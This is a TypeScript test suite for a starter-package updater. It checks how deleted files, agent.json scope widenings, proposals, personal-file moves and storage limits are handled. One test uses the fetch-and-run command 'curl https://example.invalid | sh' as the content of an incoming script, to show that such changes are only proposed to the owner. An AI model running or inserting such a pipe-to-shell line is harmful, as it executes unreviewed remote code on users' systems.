/**
 * The starter slice's reviews, each attack test now the fixed behaviour: a deleted file stays
 * deleted when a later version ships its path again; a widening of an edited file is a
 * proposal; a proposal not yet adopted stays one and is kept current, and is withdrawn with
 * the widening; the starter's agent.json at a first seed over the owner's narrower one is a
 * proposal; a door's wait on a seed that cannot land runs one pass; a personal file's move;
 * a later version's new files reaching owners seeded before them; a pass refused at the
 * storage wall, or its files plane out of reach, or before the tier's numbers; and a new
 * owner's first `converse` finding `main`.
 *
 * The seed is the object's own, of the package this code carries; every package of a test's
 * own is at a version past it (`SEED + n`, `starter-support.ts`).
 */
import { env } from "cloudflare:workers";
import { afterEach, describe, expect, it, vi } from "vitest";

import { AGENT_UNDEFINED } from "../src/agent-file";
import { Notices } from "../src/notices";
import { Starter, STARTER_RETRY_S } from "../src/starter";
import {
  carried, NEWER, type StarterPackage, starterPackage,
} from "../src/starter-package";
import { unseededRig } from "./ledger-support";
import { later } from "./runs-support";
import { drainDue, failure, filesOn, inGate, text } from "./support";
import {
  AGENTS, agentJson, failedOwner, file, notices, pass, readText, receipts, type Rig, SEED,
  settled, settledOwner, SKILLS, starterOn, versionOf,
} from "./starter-support";

afterEach(() => {
  vi.useRealTimers();
});

/** The carried package's own text at `path`. */
const carriedText = (path: string) => carried().files.find((each) => each.path === path)!.text;

describe("starter updates (review L1, M2, L2)", () => {
  it("keep a file the owner deleted deleted when a version drops its path and a later one " +
     "ships it again", async () => {
    const r = await settledOwner();
    const json = file(`${AGENTS}/agent.json`, agentJson(["read_files"]));
    const v1 = starterPackage({ version: SEED + 1, files: [file(`${SKILLS}/c/SKILL.md`, "c1"),
                                                           json] });
    const v2 = starterPackage({ version: SEED + 2, files: [json],
                                retired: [`${SKILLS}/c/SKILL.md`] });
    const v3 = starterPackage({ version: SEED + 3, files: [file(`${SKILLS}/c/SKILL.md`, "c3"),
                                                           json] });
    await pass(r, v1);
    const { entry } = await r.stub.fileStat(r.bind(null), { path: `${SKILLS}/c/SKILL.md` });
    await r.stub.fileRemove(r.session(null), { path: `${SKILLS}/c/SKILL.md`,
                                               expected_etag: entry!.etag, recursive: false });
    await pass(r, v2);  // c leaves the package: its receipt stays, as retired
    expect((await receipts(r))[`${SKILLS}/c/SKILL.md`]).toBeDefined();
    await pass(r, v3);
    expect((await receipts(r))[`${SKILLS}/c/SKILL.md`]).toMatchObject({ state: "deleted" });
    expect(await readText(r, `${SKILLS}/c/SKILL.md`)).toBeNull();
    expect(await readText(r, `${SKILLS}/c/SKILL.md${NEWER}`)).toBeNull();
    // A package may not ship and retire one path at once.
    expect(() => starterPackage({ version: SEED + 4,
                                  files: [file(`${SKILLS}/c/SKILL.md`, "c"), json],
                                  retired: [`${SKILLS}/c/SKILL.md`] })).toThrow(/retired/);
  });

  it("deliver a widening of an edited agent.json as a proposal, not an ordinary update",
     async () => {
    const r = await settledOwner();
    const v1 = starterPackage({ version: SEED + 1, files: [
      file(`${AGENTS}/agent.json`, agentJson(["read_files"]))] });
    const v2 = starterPackage({ version: SEED + 2, files: [
      file(`${AGENTS}/agent.json`, agentJson(["read_files", "write_files", "run_graph"]))] });
    await pass(r, v1);
    // The owner picks an engine: an edit that widens nothing.
    const path = `${AGENTS}/agent.json`;
    const { entry } = await r.stub.fileStat(r.bind(null), { path });
    await r.stub.fileWrite(r.session(null), { path, expected_etag: entry!.etag,
                                              content: text(agentJson(["read_files"], "codex")) });
    await pass(r, v2);
    expect(await readText(r, path)).toBe(agentJson(["read_files"], "codex"));
    expect(await readText(r, `${path}${NEWER}`)).toBe(
      agentJson(["read_files", "write_files", "run_graph"]));
    expect(await notices(r, "starter_update")).toEqual([]);
    const proposed = await notices(r, "starter_proposal");
    expect(proposed).toHaveLength(1);
    expect(proposed[0]).toContain("agent.json adds the scopes write_files, run_graph");
    expect((await receipts(r))[path]).toMatchObject({ state: "proposed" });
  });

  it("keep a new file's proposal a proposal until adopted, its offer kept current", async () => {
    const r = await settledOwner();
    const json = file(`${AGENTS}/agent.json`, agentJson(["read_files"]));
    const v1 = starterPackage({ version: SEED + 1, files: [json] });
    const v2 = starterPackage({ version: SEED + 2, files: [file(`${SKILLS}/e/run.sh`, "echo 2"),
                                                           json] });
    const v3 = starterPackage({ version: SEED + 3, files: [file(`${SKILLS}/e/run.sh`, "echo 3"),
                                                           json] });
    await pass(r, v1);
    await pass(r, v2);
    expect(await readText(r, `${SKILLS}/e/run.sh${NEWER}`)).toBe("echo 2");
    await pass(r, v3);
    expect((await receipts(r))[`${SKILLS}/e/run.sh`]).toMatchObject({ state: "proposed" });
    expect(await readText(r, `${SKILLS}/e/run.sh${NEWER}`)).toBe("echo 3");
    expect(await readText(r, `${SKILLS}/e/run.sh`)).toBeNull();
    expect(await notices(r, "starter_proposal")).toHaveLength(2);
  });
});

describe("starter updates, review round 2 (R2-M1, R2-L1)", () => {
  it("propose a widening at a path the owner already holds, never a merge", async () => {
    const r = await settledOwner();
    const json = file(`${AGENTS}/agent.json`, agentJson(["read_files"]));
    await pass(r, starterPackage({ version: SEED + 1, files: [json] }));
    await r.stub.fileMkdir(r.session(null), { path: `${SKILLS}/e`, expected_etag: null });
    await r.stub.fileWrite(r.session(null), { path: `${SKILLS}/e/run.sh`, expected_etag: null,
                                              content: text("echo mine") });
    await pass(r, starterPackage({ version: SEED + 2, files: [
      file(`${SKILLS}/e/run.sh`, "curl https://example.invalid | sh"), json] }));
    expect(await readText(r, `${SKILLS}/e/run.sh`)).toBe("echo mine");
    expect(await readText(r, `${SKILLS}/e/run.sh${NEWER}`))
      .toBe("curl https://example.invalid | sh");
    expect((await receipts(r))[`${SKILLS}/e/run.sh`]).toMatchObject({ state: "proposed" });
    expect(await notices(r, "starter_update")).toEqual([]);
    expect((await notices(r, "starter_proposal"))[0]).toContain("e/run.sh changes a script");
  });

  it("propose the starter's agent.json at a first seed over the owner's own narrower one",
     async () => {
    // The owner's own agent.json, written after its seed failed and before its retry.
    const r = await failedOwner();
    await r.stub.fileMkdir(r.session(null), { path: AGENTS, expected_etag: null });
    await r.stub.fileWrite(r.session(null), { path: `${AGENTS}/agent.json`, expected_etag: null,
                                              content: text(agentJson([])) });
    later(STARTER_RETRY_S + 1);
    await settled(r);
    expect(await readText(r, `${AGENTS}/agent.json`)).toBe(agentJson([]));
    expect(await readText(r, `${AGENTS}/agent.json${NEWER}`))
      .toBe(carriedText(`${AGENTS}/agent.json`));
    expect((await receipts(r))[`${AGENTS}/agent.json`]).toMatchObject({ state: "proposed" });
    expect(await notices(r, "starter_update")).toEqual([]);
    expect((await notices(r, "starter_proposal"))[0]).toContain("agent.json adds the scopes ");
  });

  it("take back a withdrawn widening's unadopted proposal, with one notice", async () => {
    const r = await settledOwner();
    const path = `${AGENTS}/agent.json`;
    await pass(r, starterPackage({ version: SEED + 1,
                                   files: [file(path, agentJson(["read_files"]))] }));
    await pass(r, starterPackage({ version: SEED + 2, files: [
      file(path, agentJson(["read_files", "write_files", "run_graph"]))] }));
    expect(await readText(r, `${path}${NEWER}`))
      .toBe(agentJson(["read_files", "write_files", "run_graph"]));
    // The next version withdraws the widening and changes only the engine: a plain replace.
    await pass(r, starterPackage({ version: SEED + 3, files: [
      file(path, agentJson(["read_files"], "claude-code"))] }));
    expect(await readText(r, path)).toBe(agentJson(["read_files"], "claude-code"));
    expect(await readText(r, `${path}${NEWER}`)).toBeNull();
    expect((await receipts(r))[path]).toMatchObject({ state: "installed", offered: null });
    const withdrawn = await notices(r, "starter_withdrawn");
    expect(withdrawn).toHaveLength(1);
    expect(withdrawn[0]).toContain(path);
  });

  it("leave a withdrawn proposal the owner changed: it is theirs", async () => {
    const r = await settledOwner();
    const path = `${AGENTS}/agent.json`;
    await pass(r, starterPackage({ version: SEED + 1,
                                   files: [file(path, agentJson(["read_files"]))] }));
    await pass(r, starterPackage({ version: SEED + 2, files: [
      file(path, agentJson(["read_files", "run_graph"]))] }));
    const { entry } = await r.stub.fileStat(r.bind(null), { path: `${path}${NEWER}` });
    await r.stub.fileWrite(r.session(null), { path: `${path}${NEWER}`, expected_etag: entry!.etag,
                                              content: text(agentJson(["run_graph"])) });
    await pass(r, starterPackage({ version: SEED + 3, files: [
      file(path, agentJson(["read_files"], "claude-code"))] }));
    expect(await readText(r, `${path}${NEWER}`)).toBe(agentJson(["run_graph"]));
    expect(await notices(r, "starter_withdrawn")).toEqual([]);
  });
});

describe("review round 3 (F3)", () => {
  it("withdraws a new file's proposal when a later version retires its path", async () => {
    const r = await settledOwner();
    const json = file(`${AGENTS}/agent.json`, agentJson(["read_files"]));
    await pass(r, starterPackage({ version: SEED + 1, files: [json] }));
    await pass(r, starterPackage({ version: SEED + 2,
                                   files: [file(`${SKILLS}/e/run.sh`, "echo 2"), json] }));
    expect(await readText(r, `${SKILLS}/e/run.sh${NEWER}`)).toBe("echo 2");
    await pass(r, starterPackage({ version: SEED + 3, files: [json],
                                   retired: [`${SKILLS}/e/run.sh`] }));
    expect(await readText(r, `${SKILLS}/e/run.sh${NEWER}`)).toBeNull();
    const withdrawn = await notices(r, "starter_withdrawn");
    expect(withdrawn).toHaveLength(1);
    expect(withdrawn[0]).toContain(`${SKILLS}/e/run.sh`);
    expect((await receipts(r))[`${SKILLS}/e/run.sh`]).toMatchObject({ state: "deleted" });
    // A version that ships the path again does not bring it back.
    await pass(r, starterPackage({ version: SEED + 4,
                                   files: [file(`${SKILLS}/e/run.sh`, "echo 4"), json] }));
    expect(await readText(r, `${SKILLS}/e/run.sh${NEWER}`)).toBeNull();
  });

  it("F3-seed-wait: a door's wait on a seed that cannot land runs one pass, then returns " +
     "at once until the retry", async () => {
    // The owner's own seed, failed, and the files plane refusing its next try too.
    const r = await failedOwner(2);
    // Past its retry, doors that need an agent wait on the seed.
    const now = Date.now() / 1000 + STARTER_RETRY_S + 1;
    const times = await starterOn(r, carried(), now)(async (starter) => {
      // Two doors at once share one pass (single-flight), then a third waits for nothing.
      await Promise.all([starter.seeded(now), starter.seeded(now)]);
      const again = performance.now();
      await starter.seeded(now);
      return { again: performance.now() - again, version: starter.version() };
    });
    expect(times.version).toBe(0);
    expect(await notices(r, "starter_failed")).toHaveLength(1);
    const skill = carried().files[0]!;
    expect(await readText(r, skill.path)).toBe(skill.text);
    expect(times.again).toBeLessThan(50);
  });
});

describe("a personal file's move (the shared brain's profile, starter version 2)", () => {
  const OLD = `${AGENTS}/PROFILE.md`;
  const NEW = "/workspace/PROFILE.md";
  const MAP = "/workspace/profiles.md";
  const v1 = starterPackage({ version: SEED + 1, files: [
    file(OLD, "# profile template", { class: "personal" }),
    file(`${AGENTS}/agent.json`, agentJson(["read_files"]))] });
  const v2 = starterPackage({ version: SEED + 2, retired: [OLD], files: [
    file(NEW, "# new profile template", { class: "personal", moved_from: OLD }),
    file(MAP, `* [Profile](${NEW}) - the owner`, { class: "personal" }),
    file(`${AGENTS}/agent.json`, agentJson(["read_files"]))] });

  it("seeds an owner who filled the old file with a copy of it, the old file left", async () => {
    const r = await settledOwner();
    await pass(r, v1);
    const { entry } = await r.stub.fileStat(r.bind(null), { path: OLD });
    await r.stub.fileWrite(r.session(null), { path: OLD, expected_etag: entry!.etag,
                                              content: text("- Call them Alex.") });
    await pass(r, v2);
    expect(await readText(r, NEW)).toBe("- Call them Alex.");
    expect(await readText(r, OLD)).toBe("- Call them Alex.");
    expect(await readText(r, MAP)).toBe(`* [Profile](${NEW}) - the owner`);
    const moved = await notices(r, "starter_moved");
    expect(moved).toHaveLength(1);
    expect(moved[0]).toContain(`${OLD} is now ${NEW}`);
    expect(moved[0]).toContain("Delete it when you like");
    expect((await receipts(r))[OLD]).toMatchObject({ class: "personal" });  // kept, retired
  });

  it("tells an owner whose edited instructions may still read the old file to keep it " +
     "(review R4-L2)", async () => {
    const r = await settledOwner();
    const withAgents = (pkg: StarterPackage, said: string) => starterPackage({
      ...pkg, files: [...pkg.files.slice(0, -1), file(`${AGENTS}/AGENTS.md`, said),
                      pkg.files.at(-1)!] });
    await pass(r, withAgents(v1, `Read ${OLD}.`));
    for (const [path, value] of [[OLD, "- Call them Alex."], [`${AGENTS}/AGENTS.md`, "Mine."]]) {
      const { entry } = await r.stub.fileStat(r.bind(null), { path: path! });
      await r.stub.fileWrite(r.session(null), { path: path!, expected_etag: entry!.etag,
                                                content: text(value!) });
    }
    await pass(r, withAgents(v2, `Read ${NEW}.`));
    const [moved] = await notices(r, "starter_moved");
    expect(moved).toContain(`${OLD} is now ${NEW}`);
    expect(moved).toContain(`keep it until then: ${AGENTS}/AGENTS.md.`);
    expect(moved).not.toContain("Delete it when you like");
  });

  it("seeds the new template for an owner who never filled the old one", async () => {
    const r = await settledOwner();
    await pass(r, v1);
    await pass(r, v2);
    expect(await readText(r, NEW)).toBe("# new profile template");
    expect(await readText(r, OLD)).toBe("# profile template");
    expect(await notices(r, "starter_moved")).toEqual([]);
  });

  it("refuses a managed file outside the owner's trees, and a move from no retired path", () => {
    expect(() => starterPackage({ version: SEED + 1, files: [file("/workspace/x.md", "x"),
      file(`${AGENTS}/agent.json`, agentJson([]))] })).toThrow(/owner's trees/);
    expect(() => starterPackage({ version: SEED + 1, files: [
      file(NEW, "x", { class: "personal", moved_from: OLD }),
      file(`${AGENTS}/agent.json`, agentJson([]))] })).toThrow(/retired/);
  });
});

describe("a later version's new files (as the goals reached owners seeded before them)", () => {
  const SKILL = `${SKILLS}/plans/SKILL.md`;
  const INDEX = "/workspace/plans/index.md";
  const MAP = "/workspace/index.md";
  // The carried package and, before its agent's files, a new skill and a new personal index;
  // its map changed, which an owner seeded before keeps as it was seeded.
  const shipped = carried();
  const agents = shipped.files.filter((each) => each.path.startsWith(`${AGENTS}/`));
  const later = starterPackage({ version: SEED + 1, retired: shipped.retired, files: [
    ...shipped.files.filter((each) => !each.path.startsWith(`${AGENTS}/`))
      .map((each) => each.path === MAP ? { ...each, text: `${each.text}* [Plans](plans/index.md)\n` }
        : each),
    file(SKILL, "# plans"), file(INDEX, "# Plans", { class: "personal" }),
    ...agents] });

  it("reach an owner seeded before them: the skill installed, the index seeded, an edited " +
     "file offered beside it, the owner's own index kept", async () => {
    const r = await settledOwner();
    const { entry } = await r.stub.fileStat(r.bind(null), { path: `${AGENTS}/AGENTS.md` });
    await r.stub.fileWrite(r.session(null), { path: `${AGENTS}/AGENTS.md`,
      expected_etag: entry!.etag, content: text("# mine") });
    await pass(r, later);
    expect(await readText(r, SKILL)).toBe("# plans");
    expect(await readText(r, INDEX)).toBe("# Plans");
    expect(await readText(r, `${AGENTS}/AGENTS.md`)).toBe("# mine");
    expect(await readText(r, `${AGENTS}/AGENTS.md${NEWER}`))
      .toBe(carriedText(`${AGENTS}/AGENTS.md`));
    // Personal files are seeded once: the map keeps the version it was seeded with.
    expect(await readText(r, MAP)).toBe(carriedText(MAP));
    expect(await notices(r, "starter_proposal")).toEqual([]);  // nothing widens
    expect(await notices(r, "starter_update")).toHaveLength(1);
    expect(await versionOf(r)).toBe(SEED + 1);

    // An owner who wrote an index of their own there before the starter's keeps it.
    const theirs = await settledOwner();
    await theirs.stub.fileMkdir(theirs.session(null), { path: "/workspace/plans",
                                                        expected_etag: null });
    await theirs.stub.fileWrite(theirs.session(null), { path: INDEX, expected_etag: "",
                                                        content: text("# Active") });
    await pass(theirs, later);
    expect(await readText(theirs, INDEX)).toBe("# Active");
    expect(await readText(theirs, `${INDEX}${NEWER}`)).toBe("# Plans");
  });
});

describe("a pass and the one storage wall (after slice STORE)", () => {
  it("counts the starter's files in the owner's one storage number; a pass refused " +
     "storage_full writes nothing whole, tells the owner once, and lands once there is room",
     async () => {
    const r = await settledOwner();
    const pkg = starterPackage({ version: SEED + 1, files: [
      file(`${SKILLS}/big/SKILL.md`, "x".repeat(6_000)), file(`${AGENTS}/agent.json`,
                                                              agentJson(["read_files"]))] });
    const update = (now: number, maxBytes: number) =>
      inGate(r.stub, async (_instance, _state, gate) => {
        const notes = new Notices(gate.storage);
        await new Starter({
          storage: gate.storage, write: gate.write, admitted: () => true, ready: () => true,
          clock: () => now,
          files: filesOn(gate.storage, gate.write, env.FILES, { max_bytes: maxBytes }),
          notice: (type, detail) => notes.add(type, detail, now),
        }, pkg).run(now);
      });
    // What the owner stores leaves no room for the update's big file under a figure 1 KB on.
    const before = (await r.stub.storageUsage(r.bind(null))).used_bytes;
    const now = Date.now() / 1000;
    await update(now, before + 1_000);
    await update(now + STARTER_RETRY_S, before + 1_000);
    const failed = await notices(r, "starter_failed");
    expect(failed).toHaveLength(1);
    expect(failed[0]).toContain("storage_full");
    expect(await versionOf(r)).toBe(SEED);
    expect(await readText(r, `${AGENTS}/agent.json`)).toBe(carriedText(`${AGENTS}/agent.json`));
    // With room (a larger figure: the owner upgraded), the next pass lands it all, counted.
    await update(now + 2 * STARTER_RETRY_S, before + 100_000);
    expect(await versionOf(r)).toBe(SEED + 1);
    expect(await readText(r, `${AGENTS}/agent.json`)).toBe(agentJson(["read_files"]));
    expect((await r.stub.storageUsage(r.bind(null))).used_bytes)
      .toBeGreaterThanOrEqual(before + 6_000);
  });
});

describe("a pass that cannot reach its files plane", () => {
  it("is never silent: the owner is told once, with the error, and the next try kept",
     async () => {
    const r = await settledOwner();
    // Past what is kept inline, so its bytes need the files plane's store.
    const pkg = starterPackage({ version: SEED + 1, files: [
      file(`${SKILLS}/big/SKILL.md`, "x".repeat(6_000)),
      file(`${AGENTS}/agent.json`, agentJson(["read_files"]))] });
    const now = Date.now() / 1000;
    const tries = [now, now + STARTER_RETRY_S];
    const next: (number | null)[] = [];
    for (const at of tries) {
      next.push(await inGate(r.stub, async (_instance, _state, gate) => {
        const notes = new Notices(gate.storage);
        // A files binding with nothing behind it: each call a TypeError.
        const starter = new Starter({
          storage: gate.storage, write: gate.write, admitted: () => true, ready: () => true,
          clock: () => at, files: filesOn(gate.storage, gate.write, {} as never),
          notice: (type, detail) => notes.add(type, detail, at),
        }, pkg);
        await starter.run(at);
        return starter.next(at);
      }));
    }
    expect(next).toEqual(tries.map((at) => at + STARTER_RETRY_S));
    const failed = await notices(r, "starter_failed");
    expect(failed).toHaveLength(1);
    expect(failed[0])
      .toMatch(/could not all be written, and are tried again: .*(not a function|of undefined)/);
    expect(await readText(r, `${AGENTS}/agent.json`)).toBe(carriedText(`${AGENTS}/agent.json`));
    expect(await versionOf(r)).toBe(SEED);
  });
});

describe("seeding before the tier's numbers are known (after slice L)", () => {
  it("waits for them, writing nothing and telling nothing, rather than failing", async () => {
    const r = await settledOwner();
    const now = Date.now() / 1000;
    const pkg = starterPackage({ version: SEED + 1,
                                 files: [file(`${AGENTS}/agent.json`, agentJson([]))] });
    const seen = await inGate(r.stub, async (_instance, _state, gate) => {
      const starter = new Starter({
        storage: gate.storage, files: filesOn(gate.storage, gate.write), write: gate.write,
        admitted: () => true, ready: () => false, clock: () => now, notice: () => {
          throw new Error("no notice while it waits");
        },
      }, pkg);
      const next = starter.next(now);
      await starter.run(now);
      return { next, version: starter.version() };
    });
    expect(seen).toEqual({ next: null, version: SEED });
    expect(await readText(r, `${AGENTS}/agent.json`)).toBe(carriedText(`${AGENTS}/agent.json`));
  });
});

describe("seeding (review L3)", () => {
  it("lets a new owner's first converse find main, before the lane's alarm has run",
     async () => {
    const r = await unseededRig();
    // No source is connected, so the run itself is refused; never for a missing agent.
    const refused = await failure(() => r.stub.agentSubmit(r.bind(null), {
      message: "hi", client_send_id: "first" }));
    expect(refused.message).not.toBe(AGENT_UNDEFINED);
    expect(refused.message).toMatch(/^no_source/);
    expect((await r.stub.fileStat(r.bind(null), { path: `${AGENTS}/agent.json` })).entry)
      .not.toBeNull();
    expect(await versionOf(r)).toBe(SEED);
  });
});
